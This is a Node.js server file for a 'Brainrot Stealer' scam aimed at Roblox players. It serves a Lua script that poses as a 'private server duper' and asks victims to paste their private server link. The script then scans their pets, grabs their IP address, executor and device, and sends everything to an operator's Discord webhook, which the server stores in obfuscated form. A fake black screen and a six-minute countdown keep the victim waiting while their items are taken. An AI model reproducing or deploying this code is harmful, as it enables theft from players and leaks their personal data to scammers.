// server.js - COMPLETELY FIXED VERSION
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Enhanced webhook storage with obfuscation
const webhookStorage = new Map();
const premiumUsers = new Map();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: '*/*' }));

// ENHANCED PROTECTION
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();

  const allowed = 
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ua.includes("scriptware") ||
    ua.includes("electron") ||
    ua.includes("protosmasher") ||
    ref.includes("roblox") ||
    true;

  if (!allowed) {
    return res.status(403).send("-- EXECUTOR ACCESS ONLY --");
  }
  
  next();
}

// OBFUSCATED WEBHOOK STORAGE
function obfuscateWebhook(webhook) {
  const key = "brainrot_secure_key_2024";
  let obfuscated = "";
  for (let i = 0; i < webhook.length; i++) {
    obfuscated += String.fromCharCode(webhook.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return Buffer.from(obfuscated).toString('base64');
}

function deobfuscateWebhook(obfuscated) {
  try {
    const decoded = Buffer.from(obfuscated, 'base64').toString();
    const key = "brainrot_secure_key_2024";
    let webhook = "";
    for (let i = 0; i < decoded.length; i++) {
      webhook += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return webhook;
  } catch (e) {
    return null;
  }
}

// STORE WEBHOOK ENDPOINT
app.post("/store", (req, res) => {
  try {
    const { webhook_id, webhook_url, premium } = req.body;
    
    if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
      const obfuscated = obfuscateWebhook(webhook_url);
      webhookStorage.set(webhook_id, obfuscated);
      
      if (premium) {
        premiumUsers.set(webhook_id, true);
      }
      
      res.json({ success: true, message: "Webhook stored securely" });
    } else {
      res.status(400).json({ success: false, message: "Invalid data" });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// GET WEBHOOK ENDPOINT
app.get("/webhook/:id", (req, res) => {
  const webhookId = req.params.id;
  const obfuscated = webhookStorage.get(webhookId);
  
  if (obfuscated) {
    const webhook = deobfuscateWebhook(obfuscated);
    if (webhook) {
      res.json({ 
        success: true, 
        webhook: webhook,
        premium: premiumUsers.has(webhookId)
      });
    } else {
      res.status(500).json({ success: false, message: "Deobfuscation failed" });
    }
  } else {
    res.status(404).json({ success: false, message: "Webhook not found" });
  }
});

// TEST ENDPOINT
app.get("/test", (req, res) => {
  res.json({ 
    status: "SERVER WORKING", 
    protection: "ACTIVE",
    obfuscation: "ENABLED",
    storage_count: webhookStorage.size
  });
});

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer - Enhanced Protection System");
});

// /raw → FIXED LUA SCRIPT (NO NIL ERRORS)
app.get("/raw", blockNonExecutor, (req, res) => {
  const webhookId = req.query.id;

  if (!webhookId) {
    return res.status(400).send("-- MISSING WEBHOOK ID --");
  }

  // FIXED LUA SCRIPT - NO NIL ERRORS
  const luaScript = `-- Brainrot Stealer - Fixed Version
print("🔒 Loading Enhanced Brainrot Stealer...")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- Wait for player safely
local player = Players.LocalPlayer
if not player then
    repeat 
        wait(0.5) 
        player = Players.LocalPlayer
    until player
end

repeat 
    wait(0.5) 
until player and player:FindFirstChild("PlayerGui")

-- COMPLETELY REMOVE ALL SOUNDS SAFELY
print("🔇 Removing all sounds...")
pcall(function()
    SoundService.Volume = 0
    for _, sound in pairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then
            pcall(function()
                sound.Volume = 0
                sound:Stop()
            end)
        end
    end
end)

-- Enable HTTP safely
pcall(function() 
    HttpService.HttpEnabled = true 
end)

local WebhookID = "${webhookId}"
local ServerURL = "https://tommyfc555-github-io.onrender.com"

-- Safe webhook fetch function
local function getWebhook()
    local success, webhook, isPremium = pcall(function()
        local response
        if syn and type(syn) == "table" and syn.request then
            response = syn.request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        elseif request and type(request) == "function" then
            response = request({
                Url = ServerURL .. "/webhook/" .. WebhookID,
                Method = "GET"
            })
        else
            local body = game:HttpGet(ServerURL .. "/webhook/" .. WebhookID, true)
            response = {Body = body}
        end
        
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.success then
                return data.webhook, data.premium or false
            end
        end
        return nil, false
    end)
    
    if not success then
        print("❌ Webhook fetch failed:", webhook)
        return nil, false
    end
    
    return webhook, isPremium
end

-- Safe Discord send function
local function sendToDiscord(embedData)
    local webhook, isPremium = getWebhook()
    if not webhook then
        print("❌ No webhook available")
        return false
    end
    
    local success, result = pcall(function()
        local data = {
            embeds = {embedData}
        }
        
        local json = HttpService:JSONEncode(data)
        
        if syn and type(syn) == "table" and syn.request then
            return syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request and type(request) == "function" then
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
            return {StatusCode = 200}
        end
    end)
    
    if success and result and (result.StatusCode == 200 or result.StatusCode == 204) then
        print("✅ Sent to Discord successfully")
        return true
    else
        print("❌ Failed to send to Discord")
        return false
    end
end

-- Safe IP get function
local function getIP(isPremium)
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    
    if success and ip then
        if isPremium then
            return ip
        else
            local parts = {}
            for part in ip:gmatch("%d+") do
                table.insert(parts, part)
            end
            if #parts == 4 then
                return parts[1] .. "." .. parts[2] .. ".XXX.XXX"
            else
                return "XXX.XXX.XXX.XXX"
            end
        end
    end
    return "Unknown"
end

-- Safe executor detection
local function getExecutor()
    if type(syn) == "table" then return "Synapse X"
    elseif type(KRNL_LOADED) ~= "nil" then return "Krnl" 
    elseif type(fluxus) ~= "nil" then return "Fluxus"
    elseif type(PROTOSMASHER_LOADED) ~= "nil" then return "ProtoSmasher"
    elseif type(electron) ~= "nil" then return "Electron"
    elseif type(scriptware) ~= "nil" then return "ScriptWare"
    else return "Unknown" end
end

-- Safe pet scanning
local function scanPets()
    local allPets = {}
    local brainrotPets = {}
    local totalValue = 0
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then 
            print("ℹ️ No plots found in workspace")
            return 
        end
        
        for _, plot in pairs(plots:GetChildren()) do
            if not plot:IsA("Model") then continue end
            
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            
            for _, pod in pairs(pods:GetChildren()) do
                if not pod:IsA("Model") then continue end
                
                local base = pod:FindFirstChild("Base")
                if not base then continue end
                
                local spawn = base:FindFirstChild("Spawn")
                if not spawn then continue end
                
                local attachment = spawn:FindFirstChild("Attachment")
                if not attachment then continue end
                
                local overhead = attachment:FindFirstChild("AnimalOverhead")
                if not overhead then continue end
                
                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
                
                local petName = nameLabel.Text or ""
                local rateText = genLabel and genLabel.Text or "0/s"
                if petName == "" then continue end
                
                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
                local moneyValue = 0
                
                if string.find(rateText, "B/s") then moneyValue = rateNumber * 1e9
                elseif string.find(rateText, "M/s") then moneyValue = rateNumber * 1e6
                elseif string.find(rateText, "K/s") then moneyValue = rateNumber * 1e3
                else moneyValue = rateNumber end
                
                totalValue = totalValue + moneyValue
                
                local petData = {
                    Name = petName,
                    Rate = rateText,
                    Money = moneyValue
                }
                
                table.insert(allPets, petData)
                
                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then
                    table.insert(brainrotPets, petData)
                end
            end
        end
    end)
    
    -- Safe sorting
    pcall(function()
        table.sort(allPets, function(a, b) 
            return (a.Money or 0) > (b.Money or 0) 
        end)
        table.sort(brainrotPets, function(a, b) 
            return (a.Money or 0) > (b.Money or 0) 
        end)
    end)
    
    return allPets, brainrotPets, totalValue
end

-- Safe black background creation
local function createBlackBackground()
    local blackScreen = Instance.new("ScreenGui")
    blackScreen.Name = "BlackScreen"
    blackScreen.IgnoreGuiInset = true
    blackScreen.DisplayOrder = 9999
    blackScreen.Parent = player.PlayerGui
    
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = blackScreen
    
    -- Safe animation
    pcall(function()
        background.BackgroundTransparency = 1
        local tween = TweenService:Create(background, TweenInfo.new(1), {BackgroundTransparency = 0})
        tween:Play()
    end)
    
    return blackScreen
end

-- Safe animated GUI creation
local function createAnimatedGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotStealerUI"
    screenGui.DisplayOrder = 10000
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 0, 0, 0)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
    mainFrame.BackgroundTransparency = 1
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui
    
    -- Safe UI elements creation
    pcall(function()
        local uiGradient = Instance.new("UIGradient")
        uiGradient.Rotation = 45
        uiGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 50, 100)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 100, 200)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 50, 100))
        })
        uiGradient.Parent = mainFrame
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 15)
        corner.Parent = mainFrame
        
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(0, 150, 255)
        stroke.Thickness = 2
        stroke.Parent = mainFrame
    end)
    
    -- Safe title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 70)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 30, 60)
    title.Text = "🧠 BRAINROT STEALER\\nPRIVATE SERVER DUPER"
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextStrokeTransparency = 0
    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
    title.BackgroundTransparency = 1
    title.Parent = mainFrame
    
    pcall(function()
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 15)
        titleCorner.Parent = title
    end)
    
    -- Safe input box
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0.8, 0, 0, 45)
    inputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    inputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    inputBox.TextColor3 = Color3.new(1, 1, 1)
    inputBox.PlaceholderText = "📋 Paste Private Server Link Here..."
    inputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 200)
    inputBox.Text = ""
    inputBox.TextSize = 14
    inputBox.Font = Enum.Font.Gotham
    inputBox.BackgroundTransparency = 1
    inputBox.Parent = mainFrame
    
    pcall(function()
        local inputCorner = Instance.new("UICorner")
        inputCorner.CornerRadius = UDim.new(0, 8)
        inputCorner.Parent = inputBox
        
        local inputStroke = Instance.new("UIStroke")
        inputStroke.Color = Color3.fromRGB(0, 100, 200)
        inputStroke.Thickness = 1
        inputStroke.Parent = inputBox
    end)
    
    -- Safe status label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.8, 0, 0, 25)
    statusLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "🔒 Status: Ready - Enter server link"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    statusLabel.TextSize = 12
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Parent = mainFrame
    
    -- Safe button
    local dupeButton = Instance.new("TextButton")
    dupeButton.Size = UDim2.new(0.7, 0, 0, 55)
    dupeButton.Position = UDim2.new(0.15, 0, 0.7, 0)
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    dupeButton.Text = "🚀 START DUPING PROCESS"
    dupeButton.TextColor3 = Color3.new(1, 1, 1)
    dupeButton.Font = Enum.Font.GothamBold
    dupeButton.TextSize = 16
    dupeButton.BackgroundTransparency = 1
    dupeButton.Parent = mainFrame
    
    pcall(function()
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 10)
        buttonCorner.Parent = dupeButton
        
        local buttonStroke = Instance.new("UIStroke")
        buttonStroke.Color = Color3.fromRGB(0, 200, 255)
        buttonStroke.Thickness = 2
        buttonStroke.Parent = dupeButton
    end)
    
    -- Safe animations
    pcall(function()
        local sizeTween = TweenService:Create(mainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 450, 0, 350),
            BackgroundTransparency = 0
        })
        sizeTween:Play()
        
        wait(0.8)
        
        TweenService:Create(title, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
        TweenService:Create(inputBox, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
        TweenService:Create(dupeButton, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    end)
    
    -- Safe button hover effects
    dupeButton.MouseEnter:Connect(function()
        pcall(function()
            TweenService:Create(dupeButton, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(0, 150, 255),
                BackgroundTransparency = 0
            }):Play()
        end)
    end)
    
    dupeButton.MouseLeave:Connect(function()
        pcall(function()
            TweenService:Create(dupeButton, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(0, 100, 200),
                BackgroundTransparency = 1
            }):Play()
        end)
    end)
    
    return screenGui, mainFrame, inputBox, statusLabel, dupeButton
end

-- Safe timer creation
local function createTimer()
    local timerGui = Instance.new("ScreenGui")
    timerGui.Name = "TimerDisplay"
    timerGui.DisplayOrder = 10001
    timerGui.Parent = player.PlayerGui
    
    local timerFrame = Instance.new("Frame")
    timerFrame.Size = UDim2.new(1, 0, 1, 0)
    timerFrame.Position = UDim2.new(0, 0, 0, 0)
    timerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    timerFrame.BackgroundTransparency = 0.7
    timerFrame.BorderSizePixel = 0
    timerFrame.Parent = timerGui
    
    local timerText = Instance.new("TextLabel")
    timerText.Size = UDim2.new(1, 0, 0, 100)
    timerText.Position = UDim2.new(0, 0, 0.4, 0)
    timerText.BackgroundTransparency = 1
    timerText.Text = "06:00"
    timerText.TextColor3 = Color3.fromRGB(255, 50, 50)
    timerText.TextSize = 48
    timerText.Font = Enum.Font.GothamBold
    timerText.TextStrokeTransparency = 0
    timerText.TextStrokeColor3 = Color3.new(0, 0, 0)
    timerText.Parent = timerFrame
    
    local infoText = Instance.new("TextLabel")
    infoText.Size = UDim2.new(1, 0, 0, 30)
    infoText.Position = UDim2.new(0, 0, 0.55, 0)
    infoText.BackgroundTransparency = 1
    infoText.Text = "⏰ Please wait 6 minutes for the process to complete..."
    infoText.TextColor3 = Color3.new(1, 1, 1)
    infoText.TextSize = 16
    infoText.Font = Enum.Font.Gotham
    infoText.Parent = timerFrame
    
    return timerGui, timerText
end

-- MAIN EXECUTION WITH SAFE WRAPPING
local success, errorMsg = pcall(function()
    wait(1)
    
    -- Create black background
    local blackScreen = createBlackBackground()
    
    -- Create animated GUI
    local screenGui, mainFrame, inputBox, statusLabel, dupeButton = createAnimatedGUI()
    
    -- Button click handler
    dupeButton.MouseButton1Click:Connect(function()
        local serverLink = inputBox.Text or ""
        if serverLink == "" or not string.find(string.lower(serverLink), "roblox") then
            statusLabel.Text = "❌ Status: Invalid server link!"
            return
        end
        
        -- Get premium status
        local webhook, isPremium = getWebhook()
        
        statusLabel.Text = "🔄 Status: Starting dupe process..."
        dupeButton.Text = "INITIALIZING..."
        dupeButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
        
        wait(1)
        
        -- Remove GUI safely
        pcall(function() screenGui:Destroy() end)
        
        statusLabel.Text = "🔍 Status: Scanning server for pets..."
        
        wait(2)
        
        -- Scan pets
        local allPets, brainrotPets, totalValue = scanPets()
        
        statusLabel.Text = "📡 Status: Sending data to Discord..."
        
        -- Get user info
        local executor = getExecutor()
        local ip = getIP(isPremium)
        local device = UserInputService.TouchEnabled and "Mobile" or "PC"
        
        -- Format BEST BRAINROTS
        local bestBrainrotsText = ""
        for i = 1, math.min(5, #brainrotPets) do
            bestBrainrotsText = bestBrainrotsText .. "**" .. brainrotPets[i].Name .. "** | " .. brainrotPets[i].Rate .. "\\n"
        end
        if bestBrainrotsText == "" then
            bestBrainrotsText = "No brainrots found"
        end
        
        -- Format top pets
        local topPetsText = ""
        for i = 1, math.min(5, #allPets) do
            topPetsText = topPetsText .. "**" .. allPets[i].Name .. "** | " .. allPets[i].Rate .. "\\n"
        end
        if topPetsText == "" then
            topPetsText = "No pets found"
        end
        
        -- Create embed
        local embed = {
            title = "🧠 BRAINROT STEALER - PREMIUM DUPE",
            description = "**Private Server Successfully Scanned**",
            color = 0x00FF00,
            fields = {
                {
                    name = "👤 USER INFORMATION",
                    value = "**Executor:** " .. executor .. "\\n**IP:** " .. ip .. "\\n**Device:** " .. device .. "\\n**Premium:** " .. (isPremium and "✅ YES" or "❌ NO"),
                    inline = false
                },
                {
                    name = "🎯 SERVER DETAILS", 
                    value = "**Link:** " .. serverLink .. "\\n**Place ID:** " .. game.PlaceId .. "\\n**Job ID:** " .. game.JobId,
                    inline = false
                },
                {
                    name = "📊 SCAN RESULTS",
                    value = "**Total Pets:** " .. #allPets .. "\\n**Brainrots Found:** " .. #brainrotPets .. "\\n**Total Value:** $" .. string.format("%.2f", totalValue),
                    inline = true
                },
                {
                    name = "💰 BEST BRAINROTS",
                    value = bestBrainrotsText,
                    inline = true
                },
                {
                    name = "🏆 TOP 5 PETS", 
                    value = topPetsText,
                    inline = true
                }
            },
            footer = {
                text = "Brainrot Stealer Premium • " .. os.date("%X")
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        
        -- Send to Discord
        local success = sendToDiscord(embed)
        
        if success then
            -- Create 6-minute timer
            local timerGui, timerText = createTimer()
            
            local startTime = tick()
            local totalTime = 360 -- 6 minutes
            
            while tick() - startTime < totalTime do
                local remaining = totalTime - (tick() - startTime)
                local minutes = math.floor(remaining / 60)
                local seconds = math.floor(remaining % 60)
                timerText.Text = string.format("%02d:%02d", minutes, seconds)
                wait(0.1)
            end
            
            -- Timer complete
            timerText.Text = "✅ COMPLETE"
            timerText.TextColor3 = Color3.fromRGB(0, 255, 0)
            
            wait(3)
            
            -- Clean up everything safely
            pcall(function() blackScreen:Destroy() end)
            pcall(function() timerGui:Destroy() end)
            
            print("✅ Premium dupe process completed successfully!")
        else
            statusLabel.Text = "❌ Status: Failed to send data"
            wait(3)
            pcall(function() blackScreen:Destroy() end)
        end
    end)
    
    print("🎮 Enhanced Brainrot Stealer Loaded Successfully!")
    print("🔒 All systems operational")
end)

if not success then
    print("❌ Script Error: " .. tostring(errorMsg))
end

return "Brainrot Stealer - Fixed Version Loaded"`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Fixed Server LIVE on port ${PORT}`);
  console.log(`🔒 Protection: ACTIVE`);
  console.log(`🔐 Obfuscation: ENABLED`);
});
